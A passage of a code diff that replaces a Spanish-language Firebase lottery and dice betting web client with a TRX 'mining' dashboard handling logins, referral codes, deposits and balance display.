-                    placeBetBtn.disabled = true;
-                    if (!canBet) {
-                        document.getElementById('dayNumberLimitInfo').textContent = limitInfo;
-                    } else if (!isDayBettingTime()) {
-                        document.getElementById('dayNumberLimitInfo').textContent = 'Fuera de horario de apuestas del día';
-                    } else if (!isGameEnabled) {
-                        document.getElementById('dayNumberLimitInfo').textContent = 'Apuestas deshabilitadas temporalmente';
-                    } else {
-                        document.getElementById('dayNumberLimitInfo').textContent = `Saldo insuficiente para apostar ${betAmount} CUP en ${selectedDayNumbers.length} números`;
-                    }
-                }
-            } else {
-                placeBetBtn.disabled = true;
-                document.getElementById('dayNumberLimitInfo').textContent = 'Puedes apostar hasta 50 CUP por número';
-            }
-            
-            updateNumberStyles();
-        }
-
-        function updateNightBetButton() {
-            const betAmountInput = document.getElementById('nightBetAmount');
-            let betAmount = parseFloat(betAmountInput.value) || 0;
-            
-            if (betAmount > 50) {
-                betAmount = 50;
-                betAmountInput.value = 50;
-                showAlert('warning', 'Límite excedido', 'El máximo permitido por número es 50 CUP');
-            }
-            
-            const placeBetBtn = document.getElementById('placeNightBetBtn');
-            const totalBetAmount = betAmount * selectedNightNumbers.length;
-            
-            let canBet = true;
-            let limitInfo = '';
-            
-            selectedNightNumbers.forEach(number => {
-                const currentLimit = numberLimits[number] || 0;
-                const remainingLimit = 50 - currentLimit;
-                
-                if (betAmount > remainingLimit) {
-                    canBet = false;
-                    limitInfo = `El número ${number.toString().padStart(2, '0')} solo puede recibir ${remainingLimit} CUP más (ya tiene ${currentLimit} CUP apostados)`;
-                }
-            });
-            
-            if (selectedNightNumbers.length > 0 && betAmount > 0) {
-                if (totalBetAmount <= userBalance && canBet && isNightBettingTime() && isGameEnabled) {
-                    placeBetBtn.disabled = false;
-                    document.getElementById('nightNumberLimitInfo').textContent = `Puedes apostar hasta ${50 - betAmount} CUP más por número`;
-                } else {
-                    placeBetBtn.disabled = true;
-                    if (!canBet) {
-                        document.getElementById('nightNumberLimitInfo').textContent = limitInfo;
-                    } else if (!isNightBettingTime()) {
-                        document.getElementById('nightNumberLimitInfo').textContent = 'Fuera de horario de apuestas de la noche';
-                    } else if (!isGameEnabled) {
-                        document.getElementById('nightNumberLimitInfo').textContent = 'Apuestas deshabilitadas temporalmente';
-                    } else {
-                        document.getElementById('nightNumberLimitInfo').textContent = `Saldo insuficiente para apostar ${betAmount} CUP en ${selectedNightNumbers.length} números`;
-                    }
-                }
-            } else {
-                placeBetBtn.disabled = true;
-                document.getElementById('nightNumberLimitInfo').textContent = 'Puedes apostar hasta 50 CUP por número';
-            }
-            
-            updateNumberStyles();
-        }
-
-        function updateNumberStyles() {
-            const dayNumberButtons = document.querySelectorAll('#dayNumberGrid .number-btn');
-            const nightNumberButtons = document.querySelectorAll('#nightNumberGrid .number-btn');
-            
-            dayNumberButtons.forEach(btn => {
-                const number = parseInt(btn.dataset.number);
-                const currentLimit = numberLimits[number] || 0;
-                
-                btn.classList.remove('limited');
-                
-                if (currentLimit > 0) {
-                    btn.classList.add('limited');
-                    btn.title = `Este número ya tiene ${currentLimit} CUP apostados (máximo 50)`;
-                }
-            });
-            
-            nightNumberButtons.forEach(btn => {
-                const number = parseInt(btn.dataset.number);
-                const currentLimit = numberLimits[number] || 0;
-                
-                btn.classList.remove('limited');
-                
-                if (currentLimit > 0) {
-                    btn.classList.add('limited');
-                    btn.title = `Este número ya tiene ${currentLimit} CUP apostados (máximo 50)`;
-                }
+            db.collection('pendingDeposits').doc(depositId).update({
+                status: 'rejected',
+                rejectedAt: new Date(),
+                rejectedBy: currentUser.uid,
+                rejectionReason: reason
+            })
+            .then(() => {
+                // Recargar la lista de depósitos pendientes
+                loadPendingDeposits();
+                showAlert(dashboardAlert, 'Depósito rechazado correctamente', 'success');
+            })
+            .catch((error) => {
+                console.error('Error rechazando depósito:', error);
+                showAlert(dashboardAlert, 'Error al rechazar el depósito', 'error');
             });
         }
-
-        function loadUserData() {
-            if (!currentUser) return;
+        
+        // Manejar inicio de sesión
+        function handleLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             
-            database.ref('users/' + currentUser.uid).on('value', (snapshot) => {
-                const userData = snapshot.val();
-                if (userData) {
-                    userBalance = userData.balance || 0;
-                    userBets = userData.bets || [];
-                    lastWithdrawalDate = userData.lastWithdrawalDate || null;
-                    
-                    updateUI();
-                    
-                } else {
-                    const newUserData = {
-                        name: currentUser.displayName || 'Usuario',
-                        email: currentUser.email,
-                        balance: 0,
-                        bets: [],
-                        lastWithdrawalDate: null,
-                        ip: userIP,
-                        registrationDate: Date.now()
-                    };
-                    
-                    database.ref('users/' + currentUser.uid).set(newUserData);
-                }
-            });
-            
-            database.ref('users/' + currentUser.uid + '/bets').on('child_changed', (snapshot) => {
-                const updatedBet = snapshot.val();
-                const betIndex = userBets.findIndex(bet => bet.id === updatedBet.id);
-                
-                if (betIndex !== -1) {
-                    userBets[betIndex] = updatedBet;
-                    updateUI();
-                    
-                    if (updatedBet.status === 'approved') {
-                        showAlert('success', 'Apuesta Aprobada', `Tu apuesta #${updatedBet.id} ha sido aprobada por el administrador.`);
-                    }
-                }
-            });
-        }
-
-        function loadNumberLimits() {
-            if (!currentUser) return;
-            
-            database.ref('numberLimits').on('value', (snapshot) => {
-                const limits = snapshot.val();
-                numberLimits = limits || {};
-                updateNumberStyles();
-                updateDayBetButton();
-                updateNightBetButton();
-            });
-        }
-
-        function loadRecentResults() {
-            database.ref('results').limitToLast(10).on('value', (snapshot) => {
-                const results = snapshot.val();
-                lastResults = results ? Object.values(results).reverse() : [];
-                updateUI();
-            });
-        }
-
-        function updateUI() {
-            document.getElementById('userBalance').textContent = userBalance.toLocaleString();
-            updateResultsList();
-            updateBetsList();
-            document.getElementById('clearBetsBtn').style.display = userBets.length > 0 ? 'block' : 'none';
-            updateBetButtonTime();
-        }
-
-        function updateResultsList() {
-            const resultsList = document.getElementById('resultsList');
-            resultsList.innerHTML = '';
-            
-            lastResults.forEach(result => {
-                const resultDate = new Date(result.timestamp);
-                const resultItem = document.createElement('div');
-                resultItem.className = 'result-item';
-                resultItem.innerHTML = `
-                    <div>
-                        <span class="result-number">${escapeHtml(result.number.toString().padStart(2, '0'))}</span>
-                        <span class="result-date">${escapeHtml(resultDate.toLocaleString())}</span>
-                    </div>
-                    <div class="result-prize">${escapeHtml(result.prize.toLocaleString())} CUP</div>
-                `;
-                resultsList.appendChild(resultItem);
-            });
-        }
-
-        function updateBetsList() {
-            const betsList = document.getElementById('betsList');
-            betsList.innerHTML = '';
-            
-            const sortedBets = [...userBets].sort((a, b) => b.timestamp - a.timestamp);
-            
-            sortedBets.forEach(bet => {
-                const betDate = new Date(bet.timestamp);
-                const betItem = document.createElement('div');
-                betItem.className = 'bet-item';
-                
-                let statusClass = 'pending';
-                let statusText = 'Pendiente';
-                
-                if (bet.status === 'approved') {
-                    statusClass = 'approved';
-                    statusText = 'Aprobada';
-                } else if (bet.status === 'won') {
-                    statusClass = 'won';
-                    statusText = 'Ganada';
-                } else if (bet.status === 'lost') {
-                    statusClass = 'lost';
-                    statusText = 'Perdida';
-                } else if (bet.status === 'cancelled') {
-                    statusClass = 'pending';
-                    statusText = 'Cancelada';
-                } else if (bet.status === 'completed') {
-                    statusClass = bet.win ? 'won' : 'lost';
-                    statusText = bet.win ? 'Ganada' : 'Perdida';
-                }
-                
-                if (bet.type === 'dice') {
-                    betItem.innerHTML = `
-                        <div>
-                            <div style="font-weight: 600;">Juego de Dados</div>
-                            <div class="bet-dice-info">
-                                Número: ${bet.number} (x${bet.multiplier}) - Resultado: ${bet.dice1} + ${bet.dice2} = ${bet.result}
-                            </div>
-                            <div>${escapeHtml(betDate.toLocaleString())}</div>
-                            ${bet.receipt ? `<button class="cancel-bet-btn" style="margin-top: 5px;" onclick="showReceipt('${escapeHtml(bet.id)}')">Ver Comprobante</button>` : ''}
-                        </div>
-                        <div style="text-align: right;">
-                            <div class="bet-amount-display">${escapeHtml(bet.amount.toLocaleString())} CUP</div>
-                            <div class="bet-status ${escapeHtml(statusClass)}">${escapeHtml(statusText)}</div>
-                            <div style="font-size: 0.8rem; margin-top: 3px; color: ${bet.win ? 'var(--success)' : 'var(--danger)'}">
-                                ${bet.win ? `+${(bet.amount * bet.multiplier).toLocaleString()} CUP` : `-${bet.amount.toLocaleString()} CUP`}
-                            </div>
-                        </div>
-                    `;
-                } else {
-                    let betTypeInfo = '';
-                    if (bet.betType) {
-                        betTypeInfo = `<div style="font-size: 0.8rem; color: var(--light-text); margin-top: 3px;">Tipo: ${bet.betType === 'fijo' ? 'Fijo (x90)' : 'Corrido (x25)'}</div>`;
-                    }
-                    
-                    betItem.innerHTML = `
-                        <div>
-                            <div class="bet-numbers">
-                                ${bet.numbers.map(num => `<span class="bet-number">${escapeHtml(num.toString().padStart(2, '0'))}</span>`).join('')}
-                            </div>
-                            ${betTypeInfo}
-                            <div>${escapeHtml(betDate.toLocaleString())}</div>
-                            ${bet.receipt ? `<button class="cancel-bet-btn" style="margin-top: 5px;" onclick="showReceipt('${escapeHtml(bet.id)}')">Ver Comprobante</button>` : ''}
-                        </div>
-                        <div style="text-align: right;">
-                            <div class="bet-amount-display">${escapeHtml(bet.amount.toLocaleString())} CUP</div>
-                            <div class="bet-status ${escapeHtml(statusClass)}">${escapeHtml(statusText)}</div>
-                        </div>
-                    `;
-                }
-                
-                betsList.appendChild(betItem);
-            });
-        }
-
-        function showAlert(icon, title, text) {
-            Swal.fire({
-                icon,
-                title,
-                text,
-                confirmButtonColor: '#F4B315',
-                background: '#1A141A',
-                color: '#FFFFFF'
-            });
-        }
-
-        function showError(fieldId, message) {
-            const errorElement = document.getElementById(`${fieldId}Error`);
-            errorElement.textContent = message;
-            errorElement.style.display = 'block';
-        }
-
-        function clearErrors(formId) {
-            document.querySelectorAll(`#${formId} .error-message`).forEach(el => {
-                el.style.display = 'none';
-            });
-        }
-
-        function login(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('loginEmail').value;
-            const password = document.getElementById('loginPassword').value;
-            
-            clearErrors('loginForm');
-            
-            if (!email) {
-                showError('loginEmail', 'Por favor ingresa tu correo electrónico');
+            if (!email || !password) {
+                showAlert(authAlert, 'Por favor ingresa email y contraseña', 'error');
                 return;
             }
             
-            if (!password) {
-                showError('loginPassword', 'Por favor ingresa tu contraseña');
-                return;
-            }
-            
-            const loginBtnText = document.getElementById('loginBtnText');
-            const loginLoading = document.getElementById('loginLoading');
-            
-            loginBtnText.style.display = 'none';
-            loginLoading.style.display = 'inline-block';
+            showLoader(authLoader);
             
             auth.signInWithEmailAndPassword(email, password)
-                .then(() => {
-                    closeAllModals();
+                .then((userCredential) => {
+                    hideLoader(authLoader);
+                    showAlert(authAlert, 'Inicio de sesión exitoso', 'success');
                 })
-                .catch(error => {
-                    loginBtnText.style.display = 'inline-block';
-                    loginLoading.style.display = 'none';
-                    
-                    let errorMessage = 'Error al iniciar sesión. Inténtalo de nuevo.';
-                    
-                    switch (error.code) {
-                        case 'auth/user-not-found':
-                            errorMessage = 'Usuario no encontrado.';
-                            showError('loginEmail', errorMessage);
-                            break;
-                        case 'auth/wrong-password':
-                            errorMessage = 'Contraseña incorrecta.';
-                            showError('loginPassword', errorMessage);
-                            break;
-                        case 'auth/invalid-email':
-                            errorMessage = 'Correo electrónico inválido.';
-                            showError('loginEmail', errorMessage);
-                            break;
-                        default:
-                            showAlert('error', 'Error', errorMessage);
-                    }
+                .catch((error) => {
+                    hideLoader(authLoader);
+                    showAlert(authAlert, error.message, 'error');
                 });
         }
-
-        function signup(e) {
-            e.preventDefault();
+        
+        // Manejar registro
+        function handleRegister() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const referralCode = document.getElementById('referral-code').value;
             
-            const name = document.getElementById('signupName').value.trim();
-            const email = document.getElementById('signupEmail').value.trim();
-            const password = document.getElementById('signupPassword').value;
-            const confirmPassword = document.getElementById('signupConfirmPassword').value;
-            
-            clearErrors('signupForm');
-            
-            if (!name) {
-                showError('signupName', 'Por favor ingresa tu nombre');
-                return;
-            }
-            
-            if (!email) {
-                showError('signupEmail', 'Por favor ingresa tu correo electrónico');
-                return;
-            }
-            
-            if (!password) {
-                showError('signupPassword', 'Por favor ingresa una contraseña');
+            if (!email || !password) {
+                showAlert(authAlert, 'Por favor ingresa email y contraseña', 'error');
                 return;
             }
             
             if (password.length < 6) {
-                showError('signupPassword', 'La contraseña debe tener al menos 6 caracteres');
+                showAlert(authAlert, 'La contraseña debe tener al menos 6 caracteres', 'error');
                 return;
             }
             
-            if (password !== confirmPassword) {
-                showError('signupConfirmPassword', 'Las contraseñas no coinciden');
-                return;
-            }
+            showLoader(authLoader);
             
-            if (userIP) {
-                database.ref('users').orderByChild('ip').equalTo(userIP).once('value', snapshot => {
-                    if (snapshot.exists()) {
-                        showError('signupEmail', 'Ya existe una cuenta registrada desde esta dirección IP');
-                        return;
-                    } else {
-                        proceedWithSignup();
+            auth.createUserWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    // Crear datos de usuario iniciales
+                    const userData = {
+                        email: email,
+                        balance: 0,
+                        miningEarnings: 0,
+                        referralEarnings: 0,
+                        totalDeposited: 0,
+                        totalWithdrawn: 0,
+                        referralCode: generateReferralCode(),
+                        referredBy: referralCode || null,
+                        activeMiners: ['free'],
+                        miners: {
+                            free: { active: true, purchased: true },
+                            basic: { active: false, purchased: false },
+                            advanced: { active: false, purchased: false },
+                            pro: { active: false, purchased: false }
+                        },
+                        lastMiningTime: Date.now(),
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                    };
+                    
+                    // Guardar datos del usuario
+                    return db.collection('users').doc(userCredential.user.uid).set(userData);
+                })
+                .then(() => {
+                    hideLoader(authLoader);
+                    showAlert(authAlert, 'Registro exitoso. ¡Bienvenido!', 'success');
+                    
+                    // Si hay un código de referido, actualizar el referidor
+                    if (referralCode) {
+                        processReferral(referralCode, email);
                     }
+                })
+                .catch((error) => {
+                    hideLoader(authLoader);
+                    showAlert(authAlert, error.message, 'error');
                 });
-            } else {
-                proceedWithSignup();
-            }
-            
-            function proceedWithSignup() {
-                const signupBtnText = document.getElementById('signupBtnText');
-                const signupLoading = document.getElementById('signupLoading');
-                
-                signupBtnText.style.display = 'none';
-                signupLoading.style.display = 'inline-block';
-                
-                auth.createUserWithEmailAndPassword(email, password)
-                    .then((userCredential) => {
-                        return userCredential.user.updateProfile({
-                            displayName: name
-                        });
-                    })
-                    .then(() => {
-                        const newUserData = {
-                            name: name,
-                            email: email,
-                            balance: 0,
-                            bets: [],
-                            lastWithdrawalDate: null,
-                            ip: userIP,
-                            registrationDate: Date.now()
-                        };
-                        
-                        return database.ref('users/' + auth.currentUser.uid).set(newUserData);
-                    })
-                    .then(() => {
-                        closeAllModals();
-                    })
-                    .catch(error => {
-                        signupBtnText.style.display = 'inline-block';
-                        signupLoading.style.display = 'none';
-                        
-                        let errorMessage = 'Error al registrarse. Inténtalo de nuevo.';
-                        
-                        switch (error.code) {
-                            case 'auth/email-already-in-use':
-                                errorMessage = 'El correo electrónico ya está en uso.';
-                                showError('signupEmail', errorMessage);
-                                break;
-                            case 'auth/weak-password':
-                                errorMessage = 'La contraseña debe tener al menos 6 caracteres.';
-                                showError('signupPassword', errorMessage);
-                                break;
-                            case 'auth/invalid-email':
-                                errorMessage = 'Correo electrónico inválido.';
-                                showError('signupEmail', errorMessage);
-                                break;
-                            default:
-                                showAlert('error', 'Error', errorMessage);
-                        }
-                    });
-            }
         }
-
-        function resetPassword(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('resetEmail').value.trim();
-            
-            clearErrors('resetPasswordForm');
+        
+        // Manejar cierre de sesión
+        function handleLogout() {
+            auth.signOut()
+                .then(() => {
+                    showAlert(dashboardAlert, 'Sesión cerrada exitosamente', 'success');
+                    resetMining();
+                })
+                .catch((error) => {
+                    showAlert(dashboardAlert, error.message, 'error');
+                });
+        }
+        
+        // Manejar restablecimiento de contraseña
+        function handlePasswordReset() {
+            const email = document.getElementById('email').value;
             
             if (!email) {
-                showError('resetEmail', 'Por favor ingresa tu correo electrónico');
+                showAlert(authAlert, 'Por favor ingresa tu email', 'error');
                 return;
             }
-            
-            const resetBtnText = document.getElementById('resetBtnText');
-            const resetLoading = document.getElementById('resetLoading');
-            
-            resetBtnText.style.display = 'none';
-            resetLoading.style.display = 'inline-block';
             
             auth.sendPasswordResetEmail(email)
                 .then(() => {
-                    showAlert('success', 'Enlace enviado', 'Se ha enviado un enlace para restablecer tu contraseña a tu correo electrónico.');
-                    closeModal('resetPasswordModal');
+                    showAlert(authAlert, 'Email de restablecimiento enviado', 'success');
                 })
-                .catch(error => {
-                    resetBtnText.style.display = 'inline-block';
-                    resetLoading.style.display = 'none';
-                    
-                    let errorMessage = 'Error al enviar el enlace. Inténtalo de nuevo.';
-                    
-                    if (error.code === 'auth/user-not-found') {
-                        errorMessage = 'No existe una cuenta con este correo electrónico.';
-                        showError('resetEmail', errorMessage);
-                    } else {
-                        showAlert('error', 'Error', errorMessage);
-                    }
+                .catch((error) => {
+                    showAlert(authAlert, error.message, 'error');
                 });
         }
-
-        function logout() {
-            auth.signOut().catch(error => {
-                showAlert('error', 'Error', 'Error al cerrar sesión. Inténtalo de nuevo.');
+        
+        // Cargar datos del usuario
+        function loadUserData() {
+            if (!currentUser) return;
+            
+            db.collection('users').doc(currentUser.uid).onSnapshot((doc) => {
+                if (doc.exists) {
+                    userData = doc.data();
+                    updateUI();
+                }
             });
         }
-
-        function generateBetId() {
-            return 'bet-' + Date.now() + '-' + Math.floor(Math.random() * 1000);
-        }
-
-        function generateBetReceipt(bet) {
-            const betDate = new Date(bet.timestamp);
-            const formattedDate = betDate.toLocaleString();
-            const betTypeText = bet.betType === 'fijo' ? 'Fijo (x90)' : 'Corrido (x25)';
+        
+        // Actualizar la interfaz de usuario con los datos del usuario
+        function updateUI() {
+            if (!userData) return;
             
-            return `
-                <div class="receipt">
-                    <div class="receipt-title">COMPROBANTE DE APUESTA</div>
-                    <div class="receipt-details">
-                        <div class="receipt-detail">
-                            <div class="receipt-detail-label">ID de Apuesta</div>
-                            <div class="receipt-detail-value">${escapeHtml(bet.id)}</div>
-                        </div>
-                        <div class="receipt-detail">
-                            <div class="receipt-detail-label">Fecha</div>
-                            <div class="receipt-detail-value">${escapeHtml(formattedDate)}</div>
-                        </div>
-                        <div class="receipt-detail">
-                            <div class="receipt-detail-label">Usuario</div>
-                            <div class="receipt-detail-value">${escapeHtml(currentUser.displayName || currentUser.email)}</div>
-                        </div>
-                        <div class="receipt-detail">
-                            <div class="receipt-detail-label">ID de Usuario</div>
-                            <div class="receipt-detail-value">${escapeHtml(currentUser.uid)}</div>
-                        </div>
-                    </div>
-                    <div>
-                        <div class="receipt-detail-label">Números apostados</div>
-                        <div class="receipt-numbers">
-                            ${bet.numbers.map(num => `<span class="receipt-number">${escapeHtml(num.toString().padStart(2, '0'))}</span>`).join('')}
-                        </div>
-                    </div>
-                    <div class="receipt-details">
-                        <div class="receipt-detail">
-                            <div class="receipt-detail-label">Tipo de apuesta</div>
-                            <div class="receipt-detail-value">${escapeHtml(betTypeText)}</div>
-                        </div>
-                        <div class="receipt-detail">
-                            <div class="receipt-detail-label">Cantidad por número</div>
-                            <div class="receipt-detail-value">${escapeHtml(bet.amount)} CUP</div>
-                        </div>
-                        <div class="receipt-detail">
-                            <div class="receipt-detail-label">Total apostado</div>
-                            <div class="receipt-detail-value">${escapeHtml(bet.amount * bet.numbers.length)} CUP</div>
-                        </div>
-                    </div>
-                    <div class="receipt-total">
-                        Estado: <span style="color: ${bet.status === 'pending' ? 'var(--warning)' : bet.status === 'approved' ? 'var(--success)' : bet.status === 'won' ? 'var(--success)' : bet.status === 'cancelled' ? 'var(--warning)' : 'var(--danger)'}">
-                        ${bet.status === 'pending' ? 'PENDIENTE' : bet.status === 'approved' ? 'APROBADA' : bet.status === 'won' ? 'GANADA' : bet.status === 'cancelled' ? 'CANCELADA' : 'PERDIDA'}
-                        </span>
-                    </div>
-                    <div class="receipt-footer">
-                        Gracias por jugar en Florida Lotería
-                    </div>
+            // Actualizar billetera
+            document.getElementById('wallet-balance').textContent = formatTRX(userData.balance || 0);
+            document.getElementById('total-balance').textContent = formatTRX(userData.balance || 0);
+            document.getElementById('mining-earnings').textContent = formatTRX(userData.miningEarnings || 0);
+            document.getElementById('referral-earnings-wallet').textContent = formatTRX(userData.referralEarnings || 0);
+            
+            // Actualizar sección de minería
+            document.getElementById('current-balance').textContent = formatTRX(userData.balance || 0);
+            document.getElementById('mining-earnings-tab').textContent = formatTRX(userData.miningEarnings || 0);
+            document.getElementById('total-deposited').textContent = formatTRX(userData.totalDeposited || 0);
+            
+            // Actualizar estado de las máquinas mineras
+            updateMinerButtons();
+            
+            // Actualizar sección de referidos
+            document.getElementById('referral-link-text').textContent = `https://trxmining.com/ref/${userData.referralCode}`;
+            document.getElementById('total-referrals').textContent = userData.referralsCount || 0;
+            document.getElementById('active-referrals').textContent = userData.activeReferrals || 0;
+            document.getElementById('referral-earnings').textContent = formatTRX(userData.referralEarnings || 0);
+            document.getElementById('referral-level').textContent = userData.referralLevel || 1;
+        }
+        
+        // Mostrar sección de autenticación
+        function showAuth() {
+            authSection.classList.remove('hidden');
+            dashboard.classList.add('hidden');
+            currentUser = null;
+            userData = null;
+            resetMining();
+        }
+        
+        // Mostrar dashboard
+        function showDashboard() {
+            authSection.classList.add('hidden');
+            dashboard.classList.remove('hidden');
+        }
+        
+        // Cambiar pestaña
+        function switchTab(e) {
+            // Actualizar navegación
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            e.target.classList.add('active');
+            
+            // Ocultar todos los contenidos de pestañas
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.add('hidden');
+            });
+            
+            // Mostrar la pestaña seleccionada
+            const tabName = e.target.getAttribute('data-tab');
+            document.getElementById(`${tabName}-tab`).classList.remove('hidden');
+        }
+        
+        // Cambiar a pestaña específica
+        function switchTabTo(tabName) {
+            // Actualizar navegación
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+                if (item.getAttribute('data-tab') === tabName) {
+                    item.classList.add('active');
+                }
+            });
+            
+            // Ocultar todos los contenidos de pestañas
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.add('hidden');
+            });
+            
+            // Mostrar la pestaña seleccionada
+            document.getElementById(`${tabName}-tab`).classList.remove('hidden');
+        }
+        
+        // Mostrar alerta
+        function showAlert(element, message, type) {
+            element.innerHTML = `
+                <div class="alert alert-${type}">
+                    ${message}
                 </div>
             `;
+            
+            // Auto-ocultar después de 5 segundos
+            setTimeout(() => {
+                element.innerHTML = '';
+            }, 5000);
         }
-
-        function placeBet(type) {
-            if (!currentUser) return;
-            
-            if (!isGameEnabled) {
-                showAlert('warning', 'Juego deshabilitado', 'Las apuestas están temporalmente deshabilitadas por el administrador');
-                return;
-            }
-            
-            if ((type === 'day' && !isDayBettingTime()) || (type === 'night' && !isNightBettingTime())) {
-                showAlert('warning', 'Fuera de horario', `El tablero de ${type === 'day' ? 'Medio Día' : 'Noche'} solo está disponible en su horario correspondiente`);
-                return;
-            }
-            
-            const betAmountInput = type === 'day' ? document.getElementById('dayBetAmount') : document.getElementById('nightBetAmount');
-            const selectedNumbers = type === 'day' ? selectedDayNumbers : selectedNightNumbers;
-            const betType = type === 'day' ? betTypeDay : betTypeNight;
-            
-            const betAmount = parseFloat(betAmountInput.value);
-            const totalBetAmount = betAmount * selectedNumbers.length;
-            
-            if (betAmount > 50) {
-                showAlert('error', 'Límite excedido', 'El máximo permitido por número es 50 CUP');
-                return;
-            }
-            
-            if (totalBetAmount > userBalance) {
-                showAlert('error', 'Saldo insuficiente', 'No tienes suficiente saldo para realizar esta apuesta');
-                return;
-            }
-            
-            if (selectedNumbers.length === 0) {
-                showAlert('error', 'Números no seleccionados', 'Debes seleccionar al menos un número para apostar');
-                return;
-            }
-            
-            let canBet = true;
-            selectedNumbers.forEach(number => {
-                const currentLimit = numberLimits[number] || 0;
-                if (betAmount > (50 - currentLimit)) {
-                    canBet = false;
-                }
-            });
-            
-            if (!canBet) {
-                showAlert('error', 'Límite excedido', 'Uno o más números seleccionados ya tienen apuestas cercanas al límite de 50 CUP');
-                return;
-            }
-            
-            const betId = generateBetId();
-            if (type === 'day') {
-                currentDayBetId = betId;
-            } else {
-                currentNightBetId = betId;
-            }
-            
-            const newBet = {
-                id: betId,
-                numbers: [...selectedNumbers],
-                amount: betAmount,
-                timestamp: Date.now(),
-                status: 'pending',
-                userId: currentUser.uid,
-                userName: currentUser.displayName || currentUser.email,
-                betType: betType,
-                receipt: generateBetReceipt({
-                    id: betId,
-                    numbers: [...selectedNumbers],
-                    amount: betAmount,
-                    timestamp: Date.now(),
-                    status: 'pending',
-                    betType: betType
-                }),
-                type: type
-            };
-            
-            const newBalance = userBalance - totalBetAmount;
-            const updatedBets = [...userBets, newBet];
-            
-            const updatedNumberLimits = {...numberLimits};
-            selectedNumbers.forEach(number => {
-                updatedNumberLimits[number] = (updatedNumberLimits[number] || 0) + betAmount;
-            });
-            
-            document.getElementById(`cancel${type.charAt(0).toUpperCase() + type.slice(1)}BetSection`).style.display = 'block';
-            startCancelTimer(type);
-            
-            const adminBetRef = database.ref('admin/bets').push();
-            adminBetRef.set(newBet)
-                .then(() => {
-                    return database.ref('users/' + currentUser.uid).update({
-                        balance: newBalance,
-                        bets: updatedBets
-                    });
-                })
-                .then(() => {
-                    return database.ref('numberLimits').set(updatedNumberLimits);
-                })
-                .then(() => {
-                    Swal.fire({
-                        title: 'Apuesta realizada',
-                        html: generateBetReceipt(newBet),
-                        confirmButtonColor: '#F4B315',
-                        width: '600px',
-                        background: '#1A141A',
-                        color: '#FFFFFF'
-                    });
-                    
-                    const numberGrid = type === 'day' ? 'dayNumberGrid' : 'nightNumberGrid';
-                    document.querySelectorAll(`#${numberGrid} .number-btn.selected`).forEach(btn => {
-                        btn.classList.remove('selected');
-                    });
-                    
-                    if (type === 'day') {
-                        selectedDayNumbers = [];
-                        document.getElementById('dayBetAmount').value = '';
-                        document.getElementById('placeDayBetBtn').disabled = true;
-                    } else {
-                        selectedNightNumbers = [];
-                        document.getElementById('nightBetAmount').value = '';
-                        document.getElementById('placeNightBetBtn').disabled = true;
-                    }
-                })
-                .catch(error => {
-                    console.error('Error al realizar apuesta:', error);
-                    showAlert('error', 'Error', 'No se pudo realizar la apuesta. Inténtalo de nuevo.');
-                    resetBetState(type);
-                });
+        
+        // Mostrar loader
+        function showLoader(loader) {
+            loader.classList.remove('hidden');
         }
-
-        function startCancelTimer(type) {
-            let timeLeft = 60;
-            
-            if (type === 'day') {
-                cancelDayBetTimer = setInterval(() => {
-                    timeLeft--;
-                    document.getElementById('cancelDayTimer').textContent = `Tiempo restante: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
-                    
-                    if (timeLeft <= 0) {
-                        clearInterval(cancelDayBetTimer);
-                        document.getElementById('cancelDayBetSection').style.display = 'none';
-                    }
-                }, 1000);
-                
-                cancelDayBetTimeout = setTimeout(() => {
-                    clearInterval(cancelDayBetTimer);
-                    document.getElementById('cancelDayBetSection').style.display = 'none';
-                }, 60000);
-            } else {
-                cancelNightBetTimer = setInterval(() => {
-                    timeLeft--;
-                    document.getElementById('cancelNightTimer').textContent = `Tiempo restante: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
-                    
-                    if (timeLeft <= 0) {
-                        clearInterval(cancelNightBetTimer);
-                        document.getElementById('cancelNightBetSection').style.display = 'none';
-                    }
-                }, 1000);
-                
-                cancelNightBetTimeout = setTimeout(() => {
-                    clearInterval(cancelNightBetTimer);
-                    document.getElementById('cancelNightBetSection').style.display = 'none';
-                }, 60000);
-            }
+        
+        // Ocultar loader
+        function hideLoader(loader) {
+            loader.classList.add('hidden');
         }
-
-        function cancelBet(type) {
-            if (!currentUser) return;
-            
-            const betId = type === 'day' ? currentDayBetId : currentNightBetId;
-            if (!betId) return;
-            
-            if (type === 'day') {
-                clearInterval(cancelDayBetTimer);
-                clearTimeout(cancelDayBetTimeout);
-            } else {
-                clearInterval(cancelNightBetTimer);
-                clearTimeout(cancelNightBetTimeout);
-            }
-            
-            const betIndex = userBets.findIndex(bet => bet.id === betId);
-            if (betIndex === -1) return;
-            
-            const bet = userBets[betIndex];
-            const totalBetAmount = bet.amount * bet.numbers.length;
-            const newBalance = userBalance + totalBetAmount;
-            
-            const updatedBet = {
-                ...bet,
-                status: 'cancelled',
-                receipt: generateBetReceipt({
-                    ...bet,
-                    status: 'cancelled'
-                })
-            };
-            
-            const updatedBets = [...userBets];
-            updatedBets[betIndex] = updatedBet;
-            
-            const updatedNumberLimits = {...numberLimits};
-            bet.numbers.forEach(number => {
-                updatedNumberLimits[number] = (updatedNumberLimits[number] || 0) - bet.amount;
-                if (updatedNumberLimits[number] <= 0) {
-                    delete updatedNumberLimits[number];
-                }
-            });
-            
-            database.ref('users/' + currentUser.uid).update({
-                balance: newBalance,
-                bets: updatedBets
-            })
-            .then(() => {
-                return database.ref('numberLimits').set(updatedNumberLimits);
-            })
-            .then(() => {
-                database.ref('admin/bets').orderByChild('id').equalTo(betId).once('value', snapshot => {
-                    const bets = snapshot.val();
-                    if (bets) {
-                        const betKey = Object.keys(bets)[0];
-                        database.ref('admin/bets/' + betKey).update({
-                            status: 'cancelled'
+        
+        // Formatear TRX
+        function formatTRX(amount) {
+            return Number(amount).toFixed(2) + ' TRX';
+        }
+        
+        // Generar código de referido
+        function generateReferralCode() {
